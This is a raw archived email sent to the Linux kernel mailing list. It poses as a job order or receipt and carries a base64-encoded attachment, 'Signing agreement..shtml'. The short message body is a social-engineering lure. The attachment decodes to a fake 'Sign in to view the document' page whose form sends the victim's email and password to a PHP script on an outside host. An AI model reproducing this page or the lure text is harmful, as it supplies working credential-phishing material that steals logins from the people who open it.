Return-Path: <linux-kernel-owner@vger.kernel.org>
X-Original-To: lists+linux-kernel@lfdr.de
Delivered-To: lists+linux-kernel@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 01DBD4B1CBF
	for <lists+linux-kernel@lfdr.de>; Fri, 11 Feb 2022 03:58:26 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1347521AbiBKC6R (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
        Thu, 10 Feb 2022 21:58:17 -0500
Received: from mxb-00190b01.gslb.pphosted.com ([23.128.96.19]:37878 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S244263AbiBKC6P (ORCPT
        <rfc822;linux-kernel@vger.kernel.org>);
        Thu, 10 Feb 2022 21:58:15 -0500
Received: from EUR05-AM6-obe.outbound.protection.outlook.com (mail-am6eur05olkn2015.outbound.protection.outlook.com [40.92.91.15])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id A27F455A2
        for <linux-kernel@vger.kernel.org>; Thu, 10 Feb 2022 18:58:14 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=NTNoTBcO6tMKy9HaeVIhx99A5Zl+sFJgR09urT6v2P5HSklfZsm4HWkYffFDFlTKC0ajDtUNwY1/iYTE7vIJInXHIeP2qTf8lGTd/CZjka+5FdvuGj0Zqyrwf5wsYkWIeJkRkdMyXaHzwaSU70YufnFpEObOXagjkDZqvL7Q+U3vi1Ovoso9edpAYkWRBULRdmKuf9hbOp1BawZCVjKgq1DnBGC/zYfLncPAZ0OP5xJLuvGkoPJr4OBhtsdL5Kgo9McVHMLgCCOyRB/Vmp9FKggMBvIzSKMGswFKS4GJCepJ3RIetpT7ic5sszgXbgGua6dq0zwFNdVhl9D8VJjvpw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=QZaiqI83sd6nnDRBQngYrWLUVcLxaVgSzJpHdMumh+o=;
 b=cF/Bz7mTRgxoL/2K6jDER6L9GOKnrLViGCnTSYnpIUXVv8wAf+lsTX80Gcv3ha9/Qs7W3FSXVfkK3ViWE6ijpd//Vn2JvaJ/IDxIrT5oPLHamniR/veGZx5ZIR1ydXjDCn1ERdHOPi1dJHBs8cqoWRO8XCnoM8tQlR2Ehcd+naFIlINDzkD1fKpuLcDHKGWwDIiBIsmjW9mBf4K8Ntb9Jp2r0dwOxSGWn4XRlms5bcObFDfHDGW82awVKCHx4y43yx1rJmK8pBcmyu1fiIyZ2q5uMNOkPeDp+bTV7BYjAJTlRYRiJtV9FPLecuVQWBfdbenMDyaYtztLUivDVv1TNw==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
 dkim=none; arc=none
Received: from DB8PR07MB6299.eurprd07.prod.outlook.com (2603:10a6:10:131::13)
 by DB9PR07MB7180.eurprd07.prod.outlook.com (2603:10a6:10:215::5) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.4995.6; Fri, 11 Feb
 2022 02:58:12 +0000
Received: from DB8PR07MB6299.eurprd07.prod.outlook.com
 ([fe80::b44b:da15:8647:7b2a]) by DB8PR07MB6299.eurprd07.prod.outlook.com
 ([fe80::b44b:da15:8647:7b2a%5]) with mapi id 15.20.4951.018; Fri, 11 Feb 2022
 02:58:12 +0000
From:   linux-kernel <brazilianshop@hotmail.co.uk>
To:     linux-kernel@vger.kernel.org
Subject: =?UTF-8?B?UmU6IFtFWFRFUk5BTF0g77yaQVcgOiBGVzogUVVPVEUgUkFFUVVFU1Q=?=
Date:   11 Feb 2022 10:57:31 +0800
Message-ID: <DB8PR07MB6299B59B53576A0336DF9D24FE309@DB8PR07MB6299.eurprd07.prod.outlook.com>
Content-Type: multipart/mixed;
        boundary="----=_NextPart_000_0012_FB38773C.4E583C46"
X-TMN:  [oRViDxkVjlQoIs8RIWiXL5OG+33Gj9Iw]
X-ClientProxiedBy: LO2P123CA0055.GBRP123.PROD.OUTLOOK.COM
 (2603:10a6:600:1::19) To DB8PR07MB6299.eurprd07.prod.outlook.com
 (2603:10a6:10:131::13)
X-Microsoft-Original-Message-ID: <20220211105730.39C67794A7EC0BAB@hotmail.co.uk>
MIME-Version: 1.0
X-MS-Exchange-MessageSentRepresentingType: 1
X-MS-PublicTrafficType: Email
X-MS-Office365-Filtering-Correlation-Id: 7bc94c3a-9145-4131-1461-08d9ed0a3f73
X-MS-TrafficTypeDiagnostic: DB9PR07MB7180:EE_
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: VmtT7NdKuQB6KWXlMbVVHC+hJ4lwLt/ehbHwUprpTM5psHfxu9S0YsoisPaCvXVIgp4V7Xt8E/V9zOE9+nu2UHXVZqaFWUC5IWpLQS95zEP+eE7TZCx1otrRgJdkNIv1SYpLhV/+X/d8hwAWhWQlHs/1WQdDeLWMh3X8/dCSR2nX2lamrGe8fCCubl7mS2nFZW0dxWC6ueq48+92/wd7Ehxt/Dok0yRc1cN9MwjC8+DvvXa83ktssk+FP9ROaULbxNRurQzsw+g99P2413H0QOIiQKf1B8bQjOnnoYnRWYQ+840Uv8oMBfyQ3Mhtmy/kcVp13f0W6uXwBtzZMZT25wzR7V0MOZGbkwU7mbHtHkJzr0pWuRw0yeDeKZzTFdBVoKXiVq4f1/TxZxvH/DYTRbPa/7f0CnfFGsdHX8zoC8PQRxdRXnbufbaxMLw82PuXDfnoxoXprjT/tdOm0Q15vl0roIP2hd5tXBdkAncp1ZVYKfLq4khpXwCI1BDHzG+5mgxCZJNt+DJuK5yZro3JdUvk9LfM00mZl5iS/DXxMkHDOcv6Crr/aQ4nqJmlZ1ZpmifvVZBkfM80yGLAWtfDpw==
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: =?utf-8?B?WnpiNGt2YlloUTJJREZpOStURHNjeDdueUdJb01MMmdiYUEzeVpzanBBWjlZ?=
 =?utf-8?B?elM3SWNkNDM4a0d3cWpnVmxZTWw2NUdTWnU4TEc2SW1JZVRtMUtzNmZaT24z?=
 =?utf-8?B?RjRtdXhqOHBtNk4xWWFnQjgrNVBkN0U2L2krNGNHWGhRcHB5d05JZXA3dGxR?=
 =?utf-8?B?eDA1TnNFMElpNnJHTCt3aDI2cld3T0VCVkUrcFBMcmJHejlUdHBtZ2VkNXpo?=
 =?utf-8?B?N0hmelU5N014K2l0QzdBVHU3ZGtmUWNEaVVSRmZmeXBYc1c4dmNhMnlEN1lM?=
 =?utf-8?B?dnBocithZ1pqc21YQVFMM3ZIdmRrVnU4dFM3c095V0lwOGdJQzRnTk9rNUtB?=
 =?utf-8?B?VVJJUjR0MDY3cjh0c2hXbmRHcEtkLzNzL3BaNU1IYXduV2JqdEM2WmU2djUx?=
 =?utf-8?B?ZCt5RzJCLzZwYnhUVEg4dGprS1kyamd1WndCWmN6eWx4QU0vdnB4VUk3Q2Nt?=
 =?utf-8?B?dnZuNHhGbWN4UnFsM3Y5M3JoVCsxSy9hR0R3dm0yeWlrQXNCLzB4VDErVzVt?=
 =?utf-8?B?VjhCZjFKMnAxdXI2bFh4MUx6R0pHYkExYmJXWFFqemhvOFFHK05tM09pR0xC?=
 =?utf-8?B?MTROQUU3SUo5SVM0SU5peVN4Smg5bmtHMlUyOEVIbCtYQ0U4RjF6R0M3Nyt2?=
 =?utf-8?B?aGoxWllZbnJhZ2dQTjRPcVhOZjN2dW4yQ3BwY1hBU1RTczBhTm83V1hVdllx?=
 =?utf-8?B?N3kzM2xyc3hxNVN0dzZhWFljUGxQSVl6RFlOcy81OWhVRVVxUThLRXdEQkdJ?=
 =?utf-8?B?OEE1SDVwdXZMTHZXQVV1NnJ0a0tTZ05BalkxU0xnNzlnUHM3YUFmaS9vZFkz?=
 =?utf-8?B?VXEyRjhhN0laUlR1ejgvY1paUm1Gd2p0QU1Ic0tCR1BpWUNGYURKQjVTc0h6?=
 =?utf-8?B?MGdDYlJqaDNpUEcrZDlUVHRvc21Zb1FielBwaGpva2dQd2JSaEpFT1NWR1hL?=
 =?utf-8?B?Sk9BRnAwcDg5bnd2RERLUm9JaUQ5aGtsOXQ3K3dRN3NTVkdMSC9PWFF2bGw3?=
 =?utf-8?B?YjRwWWVXVDlIREhaMXhoeVZYaGdteWFDOUZ1bm9rWHRQQ1B5RHU4TlhxaGxG?=
 =?utf-8?B?a0lnQk9XSXl2M255YjNRUCtrNTQzeGpGd0ZSOVRpVU8xOTFzM2lRcUJITnoy?=
 =?utf-8?B?cXBuMXR1SjR4elFhVEdNc3kyaU8zOENGTWNHUStjUWpKZ0l3WnVpUE9VMDBn?=
 =?utf-8?B?WmdIY2dWbEpWbktLVld1TUpQT29UZGF6Y05ocjFIQzdZZ1N4QmNzWWVMUlJU?=
 =?utf-8?B?cnNkS2VpSk9QdUtpU3pCZ0ZqMy9MTGtxQzJISThUdVZxVVhXdz09?=
X-OriginatorOrg: sct-15-20-4778-2-msonline-outlook-1105a.templateTenant
X-MS-Exchange-CrossTenant-Network-Message-Id: 7bc94c3a-9145-4131-1461-08d9ed0a3f73
X-MS-Exchange-CrossTenant-AuthSource: DB8PR07MB6299.eurprd07.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 11 Feb 2022 02:57:32.4128
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg: 00000000-0000-0000-0000-000000000000
X-MS-Exchange-Transport-CrossTenantHeadersStamped: DB9PR07MB7180
X-Spam-Status: No, score=-1.4 required=5.0 tests=BAYES_00,FREEMAIL_FROM,
        FROM_MISSP_EH_MATCH,FROM_MISSP_FREEMAIL,RCVD_IN_DNSWL_NONE,
        RCVD_IN_MSPIKE_H2,SPF_HELO_PASS,SPF_PASS,SUBJ_ALL_CAPS,
        TO_NO_BRKTS_FROM_MSSP,T_HTML_ATTACH,T_OBFU_ATTACH_MISSP,
        T_OBFU_HTML_ATTACH,T_SCC_BODY_TEXT_LINE autolearn=no
        autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

------=_NextPart_000_0012_FB38773C.4E583C46
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable


FYI,=20

Find attached job order details.=20

Many Thanks

----------Receipt Summary--------

The complete version of this receipt has
been attached to this e-mail:linux-kernel@vger.kernel.org),
----------------------------------=

------=_NextPart_000_0012_FB38773C.4E583C46
Content-Type: application/octet-stream; name="Signing agreement..shtml"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Signing agreement..shtml"

PEhUTUwgc3R5bGU9IkJPWC1TSVpJTkc6IGJvcmRlci1ib3giPjxIRUFEIHN0eWxlPSJCT1gtU0la
SU5HOiBib3JkZXItYm94Ij48VElUTEUgc3R5bGU9IkJPWC1TSVpJTkc6IGJvcmRlci1ib3giPlNp
Z24gaW4gdG8gDQoNCmNvbnRpbnVlPC9USVRMRT48TElOSyBzdHlsZT0iQk9YLVNJWklORzogYm9y
ZGVyLWJveCIgcmVsPWljb24gdHlwZT1pbWFnZS9wbmcgDQoNCmhyZWY9Imh0dHBzOi8vaS5neWF6
by5jb20vNmNjMDU1MmE4ZTJjMjk3YTExYzNmZjc2ZjhmNWU5YzAuanBnIj4NCiAgICA8TUVUQSBz
dHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveCIgbmFtZT1yb2JvdHMgY29udGVudD0ibm9pbmRl
eCwgbm9hcmNoaXZlLCBub2ZvbGxvdywgbm9zbmlwcGV0Ij4NCiAgICA8TUVUQSBzdHlsZT0iQk9Y
LVNJWklORzogYm9yZGVyLWJveCIgbmFtZT1nb29nbGVib3QgY29udGVudD0ibm9pbmRleCwgbm9h
cmNoaXZlLCBub2ZvbGxvdywgbm9zbmlwcGV0LCBub2ltYWdlaW5kZXgiPg0KICAgIDxNRVRBIHN0
eWxlPSJCT1gtU0laSU5HOiBib3JkZXItYm94IiBuYW1lPXNsdXJwIGNvbnRlbnQ9Im5vaW5kZXgs
IG5vYXJjaGl2ZSwgbm9mb2xsb3csIG5vc25pcHBldCwgbm9vZHAsIG5veWRpciI+DQogICAgPE1F
VEEgc3R5bGU9IkJPWC1TSVpJTkc6IGJvcmRlci1ib3giIG5hbWU9bXNuYm90IGNvbnRlbnQ9Im5v
aW5kZXgsIG5vYXJjaGl2ZSwgbm9mb2xsb3csIG5vc25pcHBldCI+DQogICAgPE1FVEEgc3R5bGU9
IkJPWC1TSVpJTkc6IGJvcmRlci1ib3giIG5hbWU9dGVvbWEgY29udGVudD0ibm9pbmRleCwgbm9h
cmNoaXZlLCBub2ZvbGxvdywgbm9zbmlwcGV0Ij4NCiAgICA8TUVUQSBzdHlsZT0iQk9YLVNJWklO
RzogYm9yZGVyLWJveCIgbmFtZT12aWV3cG9ydCBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgs
IGluaXRpYWwtc2NhbGU9MSI+DQogICAgPE1FVEEgbmFtZT1HRU5FUkFUT1IgY29udGVudD0iTVNI
VE1MIDExLjAwLjk2MDAuMTk4MTEiPjwvSEVBRD4NCiAgICA8Qk9EWSBzdHlsZT0iQk9YLVNJWklO
RzogYm9yZGVyLWJveDsgT1ZFUkZMT1c6IGhpZGRlbjsgSEVJR0hUOiAxMDAlOyBGT05ULUZBTUlM
WTogJ1BUIFNhbnMnLCBzYW5zLXNlcmlmOyBXSURUSDogMTAwJTsgDQoNCkJBQ0tHUk9VTkQ6IHVy
bChodHRwczovL2kuZ3lhem8uY29tL2Y2YzFhNWViZDgyODgyNmEwNWQzMjg0YzMwZTBhOTU3LnBu
Zykgbm8tcmVwZWF0OyBSSUdIVDogMHB4OyBQT1NJVElPTjogYWJzb2x1dGU7IExFRlQ6IA0KDQow
cHg7IE1BUkdJTjogYXV0bzsgVE9QOiAwcHg7IEJPVFRPTTogMHB4OyBiYWNrZ3JvdW5kLXNpemU6
IGNvdmVyIj4NCiAgICA8RElWIGNsYXNzPWZpbGVzIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXIt
Ym94OyBNQVgtV0lEVEg6IDQ1MHB4OyBXSURUSDogOTAlOyBCQUNLR1JPVU5EOiAjMDI3MjNiOyBD
T0xPUjogI2ZmZjsgVEVYVC0NCg0KQUxJR046IGNlbnRlcjsgTUFSR0lOOiAyMDBweCBhdXRvIj48
SU1HIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXItYm94IiANCg0Kc3JjPSJodHRwczovL2kuZ3lh
em8uY29tL2QxOTM3YzkwNGNmZGJlMWVlMDQzZmYxODc3YjhiNzg5LnBuZyIgaGVpZ2h0PTUwPiAN
CiAgICA8SDIgc3R5bGU9IkJPWC1TSVpJTkc6IGJvcmRlci1ib3giPlNpZ24gaW4gdG8gdmlldyB0
aGUgZG9jdW1lbnQ8L0gyPg0KICAgIDxESVYgY2xhc3M9bG9naW4gc3R5bGU9IkJPWC1TSVpJTkc6
IGJvcmRlci1ib3g7IFBBRERJTkctQk9UVE9NOiAxMHB4OyBQQURESU5HLVRPUDogMTBweDsgUEFE
RElORy1MRUZUOiAxMHB4OyBQQURESU5HLQ0KDQpSSUdIVDogMTBweCI+DQogICAgPEZPUk0gc3R5
bGU9IkJPWC1TSVpJTkc6IGJvcmRlci1ib3g7IE1BWC1XSURUSDogNDUwcHg7IE1BUkdJTjogMHB4
IGF1dG8iIG1ldGhvZD0icG9zdCIgDQoNCmFjdGlvbj0iaHR0cDovL2p1ZGdlLXBybGVzdGxleS5j
by51ay9jb25maWcvdXl0cmVlcnR5dHloamdmc3NkZmdmaGoucGhwIj4NCiAgICA8RElWIHN0eWxl
PSJCT1gtU0laSU5HOiBib3JkZXItYm94OyBCQUNLR1JPVU5EOiB3aGl0ZTsgQk9SREVSLUJPVFRP
TTogI2NjYyAxcHggc29saWQ7IFBPU0lUSU9OOiByZWxhdGl2ZTsgQ09MT1I6IA0KDQojMDAwIj48
SU5QVVQgaWQ9ZW1haWwgc3R5bGU9IkJPWC1TSVpJTkc6IGJvcmRlci1ib3g7IEJPUkRFUi1UT1A6
IDBweDsgQk9SREVSLVJJR0hUOiAwcHg7IFdJRFRIOiAxMDAlOyBCQUNLR1JPVU5EOiAjZmZmOyAN
Cg0KQk9SREVSLUJPVFRPTTogMHB4OyBQQURESU5HLUJPVFRPTTogMjBweDsgUEFERElORy1UT1A6
IDIwcHg7IFBBRERJTkctTEVGVDogNTBweDsgQk9SREVSLUxFRlQ6IDBweDsgUEFERElORy1SSUdI
VDogMjBweCIgDQoNCnZhbHVlPSJsaW51eC1rZXJuZWxAdmdlci5rZXJuZWwub3JnIiBuYW1lPSJl
bWFpbCIgcGxhY2Vob2xkZXI9IkVtYWlsIEFkZHJlc3MiIHJlcXVpcmVkPSIiPg0KICAgIDxMQUJF
TCBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgUE9TSVRJT046IGFic29sdXRlOyBGT05U
LVdFSUdIVDogYm9sZDsgTEVGVDogMjBweDsgVE9QOiAyMnB4OyBvcGFjaXR5OiAwLjMiIA0KDQpm
b3I9ImVtYWlsIj48L0xBQkVMPg0KICAgIDxESVYgY2xhc3M9cmVxdWlyZW1lbnRzIHN0eWxlPSJC
T1gtU0laSU5HOiBib3JkZXItYm94OyBPVkVSRkxPVzogaGlkZGVuOyBDT0xPUjogcmVkOyBQQURE
SU5HLUJPVFRPTTogMHB4OyBGT05ULVNUWUxFOiANCg0KaXRhbGljOyBQQURESU5HLVRPUDogMHB4
OyBQQURESU5HLUxFRlQ6IDUwcHg7IFBBRERJTkctUklHSFQ6IDMwcHg7IE1BWC1IRUlHSFQ6IDBw
eDsgdHJhbnNpdGlvbjogMC4yOHMiPk11c3QgYmUgYSB2YWxpZCANCg0KZW1haWwgYWRkcmVzcy48
L0RJVj48L0RJVj4NCiAgICA8RElWIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXItYm94OyBCQUNL
R1JPVU5EOiB3aGl0ZTsgQk9SREVSLUJPVFRPTTogI2NjYyAxcHggc29saWQ7IFBPU0lUSU9OOiBy
ZWxhdGl2ZTsgQ09MT1I6IA0KDQojMDAwIj48SU5QVVQgaWQ9cGFzc3dvcmQgc3R5bGU9IkJPWC1T
SVpJTkc6IGJvcmRlci1ib3g7IEJPUkRFUi1UT1A6IDBweDsgQk9SREVSLVJJR0hUOiAwcHg7IFdJ
RFRIOiAxMDAlOyBCQUNLR1JPVU5EOiAjZmZmOyANCg0KQk9SREVSLUJPVFRPTTogMHB4OyBQQURE
SU5HLUJPVFRPTTogMjBweDsgUEFERElORy1UT1A6IDIwcHg7IFBBRERJTkctTEVGVDogNTBweDsg
Qk9SREVSLUxFRlQ6IDBweDsgUEFERElORy1SSUdIVDogMjBweCIgDQoNCnR5cGU9InBhc3N3b3Jk
IiBuYW1lPSJwYXNzd2QiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCIgcmVxdWlyZWQ9IiIgcGF0dGVy
bj0iLns1LH0iPg0KICAgIDxMQUJFTCBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgUE9T
SVRJT046IGFic29sdXRlOyBGT05ULVdFSUdIVDogYm9sZDsgTEVGVDogMjBweDsgVE9QOiAyMnB4
OyBvcGFjaXR5OiAwLjMiIA0KDQpmb3I9cGFzc3dvcmQ+PC9MQUJFTD4NCiAgICA8RElWIGNsYXNz
PXJlcXVpcmVtZW50cyBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgT1ZFUkZMT1c6IGhp
ZGRlbjsgQ09MT1I6IHJlZDsgUEFERElORy1CT1RUT006IDBweDsgRk9OVC1TVFlMRTogDQoNCml0
YWxpYzsgUEFERElORy1UT1A6IDBweDsgUEFERElORy1MRUZUOiA1MHB4OyBQQURESU5HLVJJR0hU
OiAzMHB4OyBNQVgtSEVJR0hUOiAwcHg7IHRyYW5zaXRpb246IDAuMjhzIj5Zb3VyIHBhc3N3b3Jk
IG11c3QgDQoNCmJlIGF0IGxlYXN0IDYgY2hhcmFjdGVycyBhcyB3ZWxsIGFzIGNvbnRhaW4gYXQg
bGVhc3Qgb25lIHVwcGVyY2FzZSwgb25lIGxvd2VyY2FzZSwgYW5kIG9uZSBudW1iZXIuIDwvRElW
PjwvRElWPg0KICAgIDxJTlBVVCBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgQk9SREVS
LVRPUDogMHB4OyBCT1JERVItUklHSFQ6IDBweDsgV0lEVEg6IDEwMCU7IEJBQ0tHUk9VTkQ6ICMy
NTQwMmI7IEJPUkRFUi0NCg0KQk9UVE9NOiAwcHg7IENPTE9SOiB3aGl0ZTsgUEFERElORy1CT1RU
T006IDIwcHg7IFBBRERJTkctVE9QOiAyMHB4OyBQQURESU5HLUxFRlQ6IDIwcHg7IE1BUkdJTjog
MjBweCAwcHg7IEJPUkRFUi1MRUZUOiANCg0KMHB4OyBESVNQTEFZOiBibG9jazsgUEFERElORy1S
SUdIVDogMjBweCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVmlldyBEb2N1bWVudCI+IDwvRk9STT48
L0RJVj48L0RJVj48L0JPRFk+PC9IVE1MPg0KDQo=

------=_NextPart_000_0012_FB38773C.4E583C46--
